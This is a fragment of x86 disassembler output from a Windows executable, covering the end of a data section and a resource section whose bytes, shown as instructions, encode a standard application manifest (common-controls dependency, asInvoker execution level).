  40f023:	add    BYTE PTR [eax],ah
  40f025:	popf   
  40f026:	inc    eax
  40f027:	add    BYTE PTR [eax],dh
  40f029:	popf   
  40f02a:	inc    eax
  40f02b:	add    BYTE PTR [eax-0x63],al
  40f02e:	inc    eax
  40f02f:	add    BYTE PTR [eax-0x63],dl
  40f032:	inc    eax
  40f033:	add    BYTE PTR [eax-0x63],ah
  40f036:	inc    eax
  40f037:	add    BYTE PTR [eax-0x63],dh
  40f03a:	inc    eax
  40f03b:	add    BYTE PTR [eax-0x6fffbf63],al
  40f041:	popf   
  40f042:	inc    eax
  40f043:	add    BYTE PTR [eax+0x409d],ah
  40f049:	add    BYTE PTR [eax],al
	...

Disassembly of section .rsrc:

00410000 <.rsrc>:
	...
  41000c:	add    DWORD PTR [eax],eax
  41000e:	add    al,0x0
  410010:	or     BYTE PTR [edx],al
  410012:	add    BYTE PTR [eax-0x7fffffc8],al
  410018:	add    eax,DWORD PTR [eax]
  41001a:	add    BYTE PTR [eax],al
  41001c:	push   eax
  41001d:	add    BYTE PTR [eax],al
  41001f:	or     BYTE PTR [esi],0x0
  410022:	add    BYTE PTR [eax],al
  410024:	add    BYTE PTR [eax],0x0
  410027:	adc    BYTE PTR [eax],0x0
  41002a:	add    BYTE PTR [eax],al
  41002c:	cwde   
  41002d:	add    BYTE PTR [eax],al
  41002f:	sbb    BYTE PTR [eax],0x0
  410032:	add    BYTE PTR [eax],al
  410034:	mov    al,0x0
  410036:	add    BYTE PTR [eax+0x0],al
	...
  410044:	add    BYTE PTR [eax],al
  410046:	add    DWORD PTR [eax],eax
  410048:	add    DWORD PTR [eax],eax
  41004a:	add    BYTE PTR [eax],al
  41004c:	enter  0x0,0x80
	...
  41005c:	add    BYTE PTR [eax],al
  41005e:	add    al,0x0
  410060:	add    DWORD PTR [eax],eax
  410062:	add    BYTE PTR [eax],al
  410064:	loopne 0x410066
  410066:	add    BYTE PTR [eax+0x2],al
  41006c:	clc    
  41006d:	add    BYTE PTR [eax],al
  41006f:	add    BYTE PTR [ebx],0x0
  410072:	add    BYTE PTR [eax],al
  410074:	adc    BYTE PTR [ecx],al
  410076:	add    BYTE PTR [eax+0x4],al
  41007c:	sub    BYTE PTR [ecx],al
  41007e:	add    BYTE PTR [eax+0x0],al
	...
  41008c:	add    BYTE PTR [eax],al
  41008e:	add    DWORD PTR [eax],eax
  410090:	add    DWORD PTR [eax],eax
  410092:	add    BYTE PTR [eax],al
  410094:	inc    eax
  410095:	add    DWORD PTR [eax],eax
  410097:	add    BYTE PTR [eax],0x0
	...
  4100a6:	add    DWORD PTR [eax],eax
  4100a8:	add    DWORD PTR [eax],eax
  4100aa:	add    BYTE PTR [eax],al
  4100ac:	pop    eax
  4100ad:	add    DWORD PTR [eax],eax
  4100af:	add    BYTE PTR [eax],0x0
	...
  4100be:	add    DWORD PTR [eax],eax
  4100c0:	add    DWORD PTR [eax],eax
  4100c2:	add    BYTE PTR [eax],al
  4100c4:	jo     0x4100c7
  4100c6:	add    BYTE PTR [eax+0x0],al
	...
  4100d4:	add    BYTE PTR [eax],al
  4100d6:	add    DWORD PTR [eax],eax
  4100d8:	or     DWORD PTR [eax+eax*1],eax
  4100db:	add    BYTE PTR [eax+0x1],cl
	...
  4100ed:	add    BYTE PTR [ecx],al
  4100ef:	add    BYTE PTR [ecx],cl
  4100f1:	add    al,0x0
  4100f3:	add    BYTE PTR [eax+0x1],bl
	...
  410105:	add    BYTE PTR [ecx],al
  410107:	add    BYTE PTR [ecx],cl
  410109:	add    al,0x0
  41010b:	add    BYTE PTR [eax+0x1],ch
	...
  41011d:	add    BYTE PTR [ecx],al
  41011f:	add    BYTE PTR [ecx],cl
  410121:	add    al,0x0
  410123:	add    BYTE PTR [eax+0x1],bh
	...
  410135:	add    BYTE PTR [ecx],al
  410137:	add    BYTE PTR [ecx],cl
  410139:	add    al,0x0
  41013b:	add    al,cl
  41013d:	add    DWORD PTR [eax],eax
	...
  41014b:	add    BYTE PTR [eax],al
  41014d:	add    BYTE PTR [ecx],al
  41014f:	add    BYTE PTR [ecx],cl
  410151:	add    al,0x0
  410153:	add    al,bl
  410155:	add    DWORD PTR [eax],eax
	...
  410163:	add    BYTE PTR [eax],al
  410165:	add    BYTE PTR [ecx],al
  410167:	add    BYTE PTR [ecx],cl
  410169:	add    al,0x0
  41016b:	add    al,ch
  41016d:	add    DWORD PTR [eax],eax
	...
  41017b:	add    BYTE PTR [eax],al
  41017d:	add    BYTE PTR [ecx],al
  41017f:	add    BYTE PTR [ecx],cl
  410181:	add    al,0x0
  410183:	add    al,bh
  410185:	add    DWORD PTR [eax],eax
  410187:	add    BYTE PTR [eax],bh
  410189:	push   ds
  41018a:	add    DWORD PTR [eax],eax
  41018c:	rol    BYTE PTR [eax],1
	...
  410196:	add    BYTE PTR [eax],al
  410198:	fmul   DWORD PTR [ebx]
  41019a:	add    DWORD PTR [eax],eax
  41019c:	sub    BYTE PTR [ecx],al
	...
  4101a6:	add    BYTE PTR [eax],al
  4101a8:	add    BYTE PTR ds:0x5680001,cl
	...
  4101b6:	add    BYTE PTR [eax],al
  4101b8:	push   0xe8000112
  4101bd:	add    al,BYTE PTR [eax]
	...
  4101c7:	add    BYTE PTR [eax+0x15],dl
  4101ca:	add    DWORD PTR [eax],eax
  4101cc:	test   al,0x8
	...
  4101d6:	add    BYTE PTR [eax],al
  4101d8:	clc    
  4101d9:	sbb    eax,0x3e0001
	...
  4101e6:	add    BYTE PTR [eax],al
  4101e8:	push   0x70000108
  4101ed:	add    eax,DWORD PTR [eax]
	...
  4101f7:	add    BYTE PTR [eax],dl
  4101f9:	add    al,BYTE PTR [ecx]
  4101fb:	add    BYTE PTR [esi+0x6],dl
	...
  410206:	add    BYTE PTR [eax],al
  410208:	add    eax,DWORD PTR [eax]
  41020a:	dec    ebp
  41020b:	add    BYTE PTR [ebp+0x0],dl
  41020e:	dec    ecx
  41020f:	add    BYTE PTR [edi+edi*1],bh
  410212:	js     0x410281
  410214:	ins    BYTE PTR es:[edi],dx
  410215:	and    BYTE PTR [esi+0x65],dh
  410218:	jb     0x41028d
  41021a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  410221:	xor    BYTE PTR [edx],ah
  410223:	and    BYTE PTR [ebp+0x6e],ah
  410226:	arpl   WORD PTR [edi+0x64],bp
  410229:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  410230:	inc    esi
  410231:	sub    eax,0x73202238
  410236:	je     0x410299
  410238:	outs   dx,BYTE PTR ds:[esi]
  410239:	fs popa 
  41023b:	ins    BYTE PTR es:[edi],dx
  41023c:	outs   dx,DWORD PTR ds:[esi]
  41023d:	outs   dx,BYTE PTR ds:[esi]
  41023e:	gs cmp eax,0x73657922
  410244:	and    bh,BYTE PTR [edi]
  410246:	ds or  eax,0x2d213c0a
  41024c:	sub    eax,0x706f4320
  410251:	jns    0x4102c5
  410253:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  41025a:	sub    DWORD PTR [eax],esp
  41025c:	dec    ebp
  41025d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  410264:	je     0x410286
  410266:	inc    ebx
  410267:	outs   dx,DWORD PTR ds:[esi]
  410268:	jb     0x4102da
  41026a:	outs   dx,DWORD PTR ds:[esi]
  41026b:	jb     0x4102ce
  41026d:	je     0x4102d8
  41026f:	outs   dx,DWORD PTR ds:[esi]
  410270:	outs   dx,BYTE PTR ds:[esi]
  410271:	and    BYTE PTR ds:0xa0d3e2d,ch
  410277:	cmp    al,0x61
  410279:	jae    0x4102ee
  41027b:	gs ins DWORD PTR es:[edi],dx
  41027d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  410281:	ins    DWORD PTR es:[edi],dx
  410282:	popa   
  410283:	outs   dx,BYTE PTR ds:[esi]
  410284:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  41028b:	jb     0x410300
  41028d:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  410294:	xor    BYTE PTR [edx],ah
  410296:	and    BYTE PTR [eax+0x6d],bh
  410299:	ins    BYTE PTR es:[edi],dx
  41029a:	outs   dx,BYTE PTR ds:[esi]
  41029b:	jae    0x4102da
  41029d:	and    dh,BYTE PTR [ebp+0x72]
  4102a0:	outs   dx,BYTE PTR ds:[esi]
  4102a1:	cmp    dh,BYTE PTR [ebx+0x63]
  4102a4:	push   0x73616d65
  4102a9:	sub    eax,0x7263696d
  4102ae:	outs   dx,DWORD PTR ds:[esi]
  4102af:	jae    0x410320
  4102b1:	data16 je 0x4102e1
  4102b4:	arpl   WORD PTR [edi+0x6d],bp
  4102b7:	cmp    ah,BYTE PTR [ecx+0x73]
  4102ba:	ins    DWORD PTR es:[edi],dx
  4102bb:	cs jbe 0x4102ef
  4102be:	and    ah,BYTE PTR [eax]
  4102c0:	js     0x41032f
  4102c2:	ins    BYTE PTR es:[edi],dx
  4102c3:	outs   dx,BYTE PTR ds:[esi]
  4102c4:	jae    0x410300
  4102c6:	popa   
  4102c7:	jae    0x410336
  4102c9:	jbe    0x4102fe
  4102cb:	cmp    eax,0x6e727522
  4102d0:	cmp    dh,BYTE PTR [ebx+0x63]
  4102d3:	push   0x73616d65
  4102d8:	sub    eax,0x7263696d
  4102dd:	outs   dx,DWORD PTR ds:[esi]
  4102de:	jae    0x41034f
  4102e0:	data16 je 0x410310
  4102e3:	arpl   WORD PTR [edi+0x6d],bp
  4102e6:	cmp    ah,BYTE PTR [ecx+0x73]
  4102e9:	ins    DWORD PTR es:[edi],dx
  4102ea:	cs jbe 0x410320
  4102ed:	and    bh,BYTE PTR [esi]
  4102ef:	or     eax,0x2020200a
  4102f4:	and    BYTE PTR [ecx+eiz*2],bh
  4102f7:	jae    0x41036c
  4102f9:	gs ins DWORD PTR es:[edi],dx
  4102fb:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4102ff:	fs outs dx,BYTE PTR gs:[esi]
  410302:	je     0x41036d
  410304:	je     0x41037f
  410306:	and    BYTE PTR ds:0x2020200a,cl
  41030c:	and    BYTE PTR [eax],ah
  41030e:	and    BYTE PTR [eax],ah
  410310:	and    BYTE PTR [ecx+edi*2+0x70],dh
  410314:	gs cmp eax,0x6e697722
  41031a:	xor    esi,DWORD PTR [edx]
  41031c:	and    ah,BYTE PTR [eax]
  41031e:	or     eax,0x2020200a
  410323:	and    BYTE PTR [eax],ah
  410325:	and    BYTE PTR [eax],ah
  410327:	and    BYTE PTR [esi+0x61],ch
  41032a:	ins    DWORD PTR es:[edi],dx
  41032b:	gs cmp eax,0x49534d22
  410331:	inc    ebp
  410332:	js     0x410399
  410334:	arpl   WORD PTR [edx],sp
  410336:	or     eax,0x2020200a
  41033b:	and    BYTE PTR [eax],ah
  41033d:	and    BYTE PTR [eax],ah
  41033f:	and    BYTE PTR [esi+0x65],dh
  410342:	jb     0x4103b7
  410344:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34223d
  41034b:	xor    BYTE PTR [esi],ch
  41034d:	xor    BYTE PTR [esi],ch
  41034f:	xor    BYTE PTR [edx],ah
  410351:	or     eax,0x2020200a
  410356:	and    BYTE PTR [eax],ah
  410358:	and    BYTE PTR [eax],ah
  41035a:	and    BYTE PTR [eax+0x72],dh
  41035d:	outs   dx,DWORD PTR ds:[esi]
  41035e:	arpl   WORD PTR [ebp+0x73],sp
  410361:	jae    0x4103d2
  410363:	jb     0x4103a6
  410365:	jb     0x4103ca
  410367:	push   0x63657469
  41036c:	je     0x4103e3
  41036e:	jb     0x4103d5
  410370:	cmp    eax,0x36387822
  410375:	and    cl,BYTE PTR ds:0x2020200a
  41037b:	and    BYTE PTR [edi],ch
  41037d:	ds or  eax,0x2020200a
  410383:	and    BYTE PTR [esp+eiz*2],bh
  410386:	gs jae 0x4103ec
  410389:	jb     0x4103f4
  41038b:	jo     0x410401
  41038d:	imul   ebp,DWORD PTR [edi+0x6e],0x6957203e
  410394:	outs   dx,BYTE PTR ds:[esi]
  410395:	outs   dx,DWORD PTR fs:[esi]
  410397:	ja     0x41040c
  410399:	and    BYTE PTR [ecx+0x6e],ch
  41039c:	jae    0x410412
  41039e:	popa   
  41039f:	ins    BYTE PTR es:[edi],dx
  4103a0:	ins    BYTE PTR es:[edi],dx
  4103a1:	gs jb  0x4103c4
  4103a4:	jae    0x41040b
  4103a6:	je     0x41041d
  4103a8:	jo     0x4103ca
  4103aa:	jae    0x410411
  4103ac:	jb     0x410424
  4103ae:	imul   esp,DWORD PTR [ebx+0x65],0x642f3c20
  4103b5:	gs jae 0x41041b
  4103b8:	jb     0x410423
  4103ba:	jo     0x410430
  4103bc:	imul   ebp,DWORD PTR [edi+0x6e],0x200a0d3e
  4103c3:	and    BYTE PTR [eax],ah
  4103c5:	and    BYTE PTR [esp+eiz*2],bh
  4103c8:	gs jo  0x410430
  4103cb:	outs   dx,BYTE PTR ds:[esi]
  4103cc:	fs outs dx,BYTE PTR gs:[esi]
  4103cf:	arpl   WORD PTR [ecx+0x3e],di
  4103d2:	or     eax,0x2020200a
  4103d7:	and    BYTE PTR [eax],ah
  4103d9:	and    BYTE PTR [eax],ah
  4103db:	and    BYTE PTR [esp+eiz*2],bh
  4103de:	gs jo  0x410446
  4103e1:	outs   dx,BYTE PTR ds:[esi]
  4103e2:	fs outs dx,BYTE PTR gs:[esi]
  4103e5:	je     0x410428
  4103e7:	jae    0x41045c
  4103e9:	gs ins DWORD PTR es:[edi],dx
  4103eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4103ef:	or     eax,0x2020200a
  4103f4:	and    BYTE PTR [eax],ah
  4103f6:	and    BYTE PTR [eax],ah
  4103f8:	and    BYTE PTR [eax],ah
  4103fa:	and    BYTE PTR [eax],ah
  4103fc:	and    BYTE PTR [ecx+eiz*2],bh
  4103ff:	jae    0x410474
  410401:	gs ins DWORD PTR es:[edi],dx
  410403:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  410407:	fs outs dx,BYTE PTR gs:[esi]
  41040a:	je     0x410475
  41040c:	je     0x410487
  41040e:	or     eax,0x2020200a
  410413:	and    BYTE PTR [eax],ah
  410415:	and    BYTE PTR [eax],ah
  410417:	and    BYTE PTR [eax],ah
  410419:	and    BYTE PTR [eax],ah
  41041b:	and    BYTE PTR [eax],ah
  41041d:	and    BYTE PTR [eax],ah
  41041f:	and    BYTE PTR [ecx+edi*2+0x70],dh
  410423:	gs cmp eax,0x6e697722
  410429:	xor    esi,DWORD PTR [edx]
  41042b:	and    cl,BYTE PTR ds:0x2020200a
  410431:	and    BYTE PTR [eax],ah
  410433:	and    BYTE PTR [eax],ah
  410435:	and    BYTE PTR [eax],ah
  410437:	and    BYTE PTR [eax],ah
  410439:	and    BYTE PTR [eax],ah
  41043b:	and    BYTE PTR [eax],ah
  41043d:	and    BYTE PTR [esi+0x61],ch
  410440:	ins    DWORD PTR es:[edi],dx
  410441:	gs cmp eax,0x63694d22
  410447:	jb     0x4104b8
  410449:	jae    0x4104ba
  41044b:	data16 je 0x41047c
  41044e:	push   edi
  41044f:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  410456:	inc    ebx
  410457:	outs   dx,DWORD PTR ds:[esi]
  410458:	ins    DWORD PTR es:[edi],dx
  410459:	ins    DWORD PTR es:[edi],dx
  41045a:	outs   dx,DWORD PTR ds:[esi]
  41045b:	outs   dx,BYTE PTR ds:[esi]
  41045c:	sub    eax,0x746e6f43
  410461:	jb     0x4104d2
  410463:	ins    BYTE PTR es:[edi],dx
  410464:	jae    0x410488
  410466:	or     eax,0x2020200a
  41046b:	and    BYTE PTR [eax],ah
  41046d:	and    BYTE PTR [eax],ah
  41046f:	and    BYTE PTR [eax],ah
  410471:	and    BYTE PTR [eax],ah
  410473:	and    BYTE PTR [eax],ah
  410475:	and    BYTE PTR [eax],ah
  410477:	and    BYTE PTR [esi+0x65],dh
  41047a:	jb     0x4104ef
  41047c:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  410483:	xor    BYTE PTR [esi],ch
  410485:	xor    BYTE PTR [esi],ch
  410487:	xor    BYTE PTR [edx],ah
  410489:	or     eax,0x2020200a
  41048e:	and    BYTE PTR [eax],ah
  410490:	and    BYTE PTR [eax],ah
  410492:	and    BYTE PTR [eax],ah
  410494:	and    BYTE PTR [eax],ah
  410496:	and    BYTE PTR [eax],ah
  410498:	and    BYTE PTR [eax],ah
  41049a:	and    BYTE PTR [eax+0x75],dh
  41049d:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4104a1:	dec    ebx
  4104a2:	gs jns 0x4104f9
  4104a5:	outs   dx,DWORD PTR ds:[esi]
  4104a6:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4104aa:	and    dh,BYTE PTR [esi]
  4104ac:	xor    eax,0x36623539
  4104b1:	xor    al,0x31
  4104b3:	xor    al,0x34
  4104b5:	arpl   WORD PTR [ebx+0x66],sp
  4104b8:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  4104bc:	or     eax,0x2020200a
  4104c1:	and    BYTE PTR [eax],ah
  4104c3:	and    BYTE PTR [eax],ah
  4104c5:	and    BYTE PTR [eax],ah
  4104c7:	and    BYTE PTR [eax],ah
  4104c9:	and    BYTE PTR [eax],ah
  4104cb:	and    BYTE PTR [eax],ah
  4104cd:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  4104d1:	addr16 jne 0x410535
  4104d4:	addr16 gs cmp eax,0xd222a22
  4104db:	or     ah,BYTE PTR [eax]
  4104dd:	and    BYTE PTR [eax],ah
  4104df:	and    BYTE PTR [eax],ah
  4104e1:	and    BYTE PTR [eax],ah
  4104e3:	and    BYTE PTR [eax],ah
  4104e5:	and    BYTE PTR [eax],ah
  4104e7:	and    BYTE PTR [eax],ah
  4104e9:	and    BYTE PTR [eax],ah
  4104eb:	and    BYTE PTR [eax+0x72],dh
  4104ee:	outs   dx,DWORD PTR ds:[esi]
  4104ef:	arpl   WORD PTR [ebp+0x73],sp
  4104f2:	jae    0x410563
  4104f4:	jb     0x410537
  4104f6:	jb     0x41055b
  4104f8:	push   0x63657469
  4104fd:	je     0x410574
  4104ff:	jb     0x410566
  410501:	cmp    eax,0x36387822
  410506:	and    ch,BYTE PTR [edi]
  410508:	ds or  eax,0x2020200a
  41050e:	and    BYTE PTR [eax],ah
  410510:	and    BYTE PTR [eax],ah
  410512:	and    BYTE PTR [edi+ebp*1],bh
  410515:	fs gs jo 0x41057e
  410519:	outs   dx,BYTE PTR ds:[esi]
  41051a:	fs outs dx,BYTE PTR gs:[esi]
  41051d:	je     0x410560
  41051f:	jae    0x410594
  410521:	gs ins DWORD PTR es:[edi],dx
  410523:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  410527:	or     eax,0x2020200a
  41052c:	and    BYTE PTR [edi+ebp*1],bh
  41052f:	fs gs jo 0x410598
  410533:	outs   dx,BYTE PTR ds:[esi]
  410534:	fs outs dx,BYTE PTR gs:[esi]
  410537:	arpl   WORD PTR [ecx+0x3e],di
  41053a:	or     eax,0x2020200a
  41053f:	and    BYTE PTR [esp+esi*2],bh
  410542:	jb     0x4105b9
  410544:	jae    0x4105ba
  410546:	dec    ecx
  410547:	outs   dx,BYTE PTR ds:[esi]
  410548:	outs   dx,WORD PTR ds:[esi]
  41054a:	and    BYTE PTR [eax+0x6d],bh
  41054d:	ins    BYTE PTR es:[edi],dx
  41054e:	outs   dx,BYTE PTR ds:[esi]
  41054f:	jae    0x41058e
  410551:	and    dh,BYTE PTR [ebp+0x72]
  410554:	outs   dx,BYTE PTR ds:[esi]
  410555:	cmp    dh,BYTE PTR [ebx+0x63]
  410558:	push   0x73616d65
  41055d:	sub    eax,0x7263696d
  410562:	outs   dx,DWORD PTR ds:[esi]
  410563:	jae    0x4105d4
  410565:	data16 je 0x410595
  410568:	arpl   WORD PTR [edi+0x6d],bp
  41056b:	cmp    ah,BYTE PTR [ecx+0x73]
  41056e:	ins    DWORD PTR es:[edi],dx
  41056f:	cs jbe 0x4105a5
  410572:	and    bh,BYTE PTR [esi]
  410574:	or     eax,0x2020200a
  410579:	and    BYTE PTR [eax],ah
  41057b:	and    BYTE PTR [eax],ah
  41057d:	and    BYTE PTR [ebx+esi*2],bh
  410580:	arpl   WORD PTR gs:[ebp+0x72],si
  410584:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  41058c:	and    BYTE PTR [eax],ah
  41058e:	and    BYTE PTR [eax],ah
  410590:	and    BYTE PTR [eax],ah
  410592:	and    BYTE PTR [eax],ah
  410594:	and    BYTE PTR [eax],ah
  410596:	cmp    al,0x72
  410598:	gs jno 0x410610
  41059b:	gs jae 0x410612
  41059e:	gs fs push eax
  4105a1:	jb     0x41060c
  4105a3:	jbe    0x41060e
  4105a5:	ins    BYTE PTR es:[edi],dx
  4105a6:	gs addr16 gs jae 0x4105e9
  4105ab:	or     eax,0x2020200a
  4105b0:	and    BYTE PTR [eax],ah
  4105b2:	and    BYTE PTR [eax],ah
  4105b4:	and    BYTE PTR [eax],ah
  4105b6:	and    BYTE PTR [eax],ah
  4105b8:	and    BYTE PTR [eax],ah
  4105ba:	and    BYTE PTR [eax],ah
  4105bc:	and    BYTE PTR [edx+esi*2],bh
  4105bf:	gs jno 0x410637
  4105c2:	gs jae 0x410639
  4105c5:	gs fs inc ebp
  4105c8:	js     0x41062f
  4105ca:	arpl   WORD PTR [ebp+0x74],si
  4105cd:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4105d4:	ins    BYTE PTR es:[edi],dx
  4105d5:	or     eax,0x2020200a
  4105da:	and    BYTE PTR [eax],ah
  4105dc:	and    BYTE PTR [eax],ah
  4105de:	and    BYTE PTR [eax],ah
  4105e0:	and    BYTE PTR [eax],ah
  4105e2:	and    BYTE PTR [eax],ah
  4105e4:	and    BYTE PTR [eax],ah
  4105e6:	and    BYTE PTR [eax],ah
  4105e8:	and    BYTE PTR [eax],ah
  4105ea:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4105ee:	gs ins BYTE PTR es:[edi],dx
  4105f0:	cmp    eax,0x49736122
  4105f5:	outs   dx,BYTE PTR ds:[esi]
  4105f6:	jbe    0x410667
  4105f8:	imul   esp,DWORD PTR [ebp+0x72],0x22
  4105fc:	or     eax,0x2020200a
  410601:	and    BYTE PTR [eax],ah
  410603:	and    BYTE PTR [eax],ah
  410605:	and    BYTE PTR [eax],ah
  410607:	and    BYTE PTR [eax],ah
  410609:	and    BYTE PTR [eax],ah
  41060b:	and    BYTE PTR [eax],ah
  41060d:	and    BYTE PTR [eax],ah
  41060f:	and    BYTE PTR [eax],ah
  410611:	and    BYTE PTR [ebp+0x69],dh
  410614:	inc    ecx
  410615:	arpl   WORD PTR [ebx+0x65],sp
  410618:	jae    0x41068d
  41061a:	cmp    eax,0x6c616622
  41061f:	jae    0x410686
  410621:	and    cl,BYTE PTR ds:0x2020200a
  410627:	and    BYTE PTR [eax],ah
  410629:	and    BYTE PTR [eax],ah
  41062b:	and    BYTE PTR [eax],ah
  41062d:	and    BYTE PTR [eax],ah
  41062f:	and    BYTE PTR [eax],ah
  410631:	and    BYTE PTR [eax],ah
  410633:	and    BYTE PTR [edi],ch
  410635:	ds or  eax,0x2020200a
  41063b:	and    BYTE PTR [eax],ah
  41063d:	and    BYTE PTR [eax],ah
  41063f:	and    BYTE PTR [eax],ah
  410641:	and    BYTE PTR [eax],ah
  410643:	and    BYTE PTR [edi+ebp*1],bh
  410646:	jb     0x4106ad
  410648:	jno    0x4106bf
  41064a:	gs jae 0x4106c1
  41064d:	gs fs push eax
  410650:	jb     0x4106bb
  410652:	jbe    0x4106bd
  410654:	ins    BYTE PTR es:[edi],dx
  410655:	gs addr16 gs jae 0x410698
  41065a:	or     eax,0x2020200a
  41065f:	and    BYTE PTR [eax],ah
  410661:	and    BYTE PTR [eax],ah
  410663:	and    BYTE PTR [edi+ebp*1],bh
  410666:	jae    0x4106cd
  410668:	arpl   WORD PTR [ebp+0x72],si
  41066b:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  410673:	and    BYTE PTR [eax],ah
  410675:	cmp    al,0x2f
  410677:	je     0x4106eb
  410679:	jne    0x4106ee
  41067b:	je     0x4106c6
  41067d:	outs   dx,BYTE PTR ds:[esi]
  41067e:	outs   dx,WORD PTR ds:[esi]
  410680:	ds or  eax,0x2020200a
  410686:	and    BYTE PTR [ebx+eiz*2],bh
  410689:	outs   dx,DWORD PTR ds:[esi]
  41068a:	ins    DWORD PTR es:[edi],dx
  41068b:	jo     0x4106ee
  41068d:	je     0x4106f8
  41068f:	bound  ebp,QWORD PTR [ecx+0x6c]
  410692:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6e6c6d78
  41069a:	jae    0x4106d9
  41069c:	and    dh,BYTE PTR [ebp+0x72]
  41069f:	outs   dx,BYTE PTR ds:[esi]
  4106a0:	cmp    dh,BYTE PTR [ebx+0x63]
  4106a3:	push   0x73616d65
  4106a8:	sub    eax,0x7263696d
  4106ad:	outs   dx,DWORD PTR ds:[esi]
  4106ae:	jae    0x41071f
  4106b0:	data16 je 0x4106e0
  4106b3:	arpl   WORD PTR [edi+0x6d],bp
  4106b6:	cmp    ah,BYTE PTR [ebx+0x6f]
  4106b9:	ins    DWORD PTR es:[edi],dx
  4106ba:	jo     0x41071d
  4106bc:	je     0x410727
  4106be:	bound  ebp,QWORD PTR [ecx+0x6c]
  4106c1:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x3e223176
  4106c9:	and    BYTE PTR ds:0x2020200a,cl
  4106cf:	and    BYTE PTR [eax],ah
  4106d1:	and    BYTE PTR [eax],ah
  4106d3:	and    BYTE PTR [ecx+eiz*2],bh
  4106d6:	jo     0x410748
  4106d8:	ins    BYTE PTR es:[edi],dx
  4106d9:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4106e0:	and    BYTE PTR ds:0x2020200a,cl
  4106e7:	and    BYTE PTR [eax],ah
  4106e9:	and    BYTE PTR [eax],ah
  4106eb:	and    BYTE PTR [eax],ah
  4106ed:	and    BYTE PTR [eax],ah
  4106ef:	and    BYTE PTR [ecx+eiz*1],bh
  4106f2:	sub    eax,0x6957202d
  4106f7:	outs   dx,BYTE PTR ds:[esi]
  4106f8:	outs   dx,DWORD PTR fs:[esi]
  4106fa:	ja     0x41076f
  4106fc:	and    BYTE PTR [edx+0x4c],al
  4106ff:	push   ebp
  410700:	inc    ebp
  410701:	and    BYTE PTR ds:0xa0d3e2d,ch
  410707:	and    BYTE PTR [eax],ah
  410709:	and    BYTE PTR [eax],ah
  41070b:	and    BYTE PTR [eax],ah
  41070d:	and    BYTE PTR [eax],ah
  41070f:	and    BYTE PTR [eax],ah
  410711:	and    BYTE PTR [eax],ah
  410713:	cmp    al,0x73
  410715:	jne    0x410787
  410717:	jo     0x410788
  410719:	jb     0x41078f
  41071b:	gs fs dec edi
  41071e:	push   ebx
  41071f:	and    BYTE PTR [ecx+0x64],cl
  410722:	cmp    eax,0x66317b22
  410727:	ss aaa 
  410729:	arpl   WORD PTR ss:[edi],si
  41072c:	ss sub eax,0x31653038
  410732:	sub    eax,0x39333234
  410737:	sub    eax,0x62623539
  41073c:	sub    eax,0x30643338
  410741:	data16 ss xor BYTE PTR fs:[ecx+eiz*2+0x37],ah
  410748:	cmp    BYTE PTR [ebp+0x22],bh
  41074b:	das    
  41074c:	ds or  eax,0x2020200a
  410752:	and    BYTE PTR [eax],ah
  410754:	and    BYTE PTR [eax],ah
  410756:	and    BYTE PTR [edi+ebp*1],bh
  410759:	popa   
  41075a:	jo     0x4107cc
  41075c:	ins    BYTE PTR es:[edi],dx
  41075d:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  410764:	and    BYTE PTR ds:0x2020200a,cl
  41076b:	and    BYTE PTR [edi+ebp*1],bh
  41076e:	arpl   WORD PTR [edi+0x6d],bp
  410771:	jo     0x4107d4
  410773:	je     0x4107de
  410775:	bound  ebp,QWORD PTR [ecx+0x6c]
  410778:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  410780:	and    BYTE PTR [eax],ah
  410782:	cmp    al,0x61
  410784:	jae    0x4107f3
  410786:	jbe    0x4107bb
  410788:	cmp    ah,BYTE PTR [ecx+0x70]
  41078b:	jo     0x4107f9
  41078d:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  410794:	ds or  eax,0x2020200a
  41079a:	and    BYTE PTR [eax],ah
  41079c:	and    BYTE PTR [eax],ah
  41079e:	and    BYTE PTR [ecx+eiz*2],bh
  4107a1:	jae    0x410810
  4107a3:	jbe    0x4107d8
  4107a5:	cmp    dh,BYTE PTR [edi+0x69]
  4107a8:	outs   dx,BYTE PTR ds:[esi]
  4107a9:	outs   dx,DWORD PTR fs:[esi]
  4107ab:	ja     0x410820
  4107ad:	push   ebx
  4107ae:	gs je  0x410825
  4107b1:	imul   ebp,DWORD PTR [esi+0x67],0x6d782073
  4107b8:	ins    BYTE PTR es:[edi],dx
  4107b9:	outs   dx,BYTE PTR ds:[esi]
  4107ba:	jae    0x4107f9
  4107bc:	and    ch,BYTE PTR [eax+0x74]
  4107bf:	je     0x410831
  4107c1:	cmp    ch,BYTE PTR [edi]
  4107c3:	das    
  4107c4:	jae    0x410829
  4107c6:	push   0x73616d65
  4107cb:	cs ins DWORD PTR es:[edi],dx
  4107cd:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4107d4:	je     0x410804
  4107d6:	arpl   WORD PTR [edi+0x6d],bp
  4107d9:	das    
  4107da:	push   ebx
  4107db:	dec    ebp
  4107dc:	dec    ecx
  4107dd:	das    
  4107de:	xor    dh,BYTE PTR [eax]
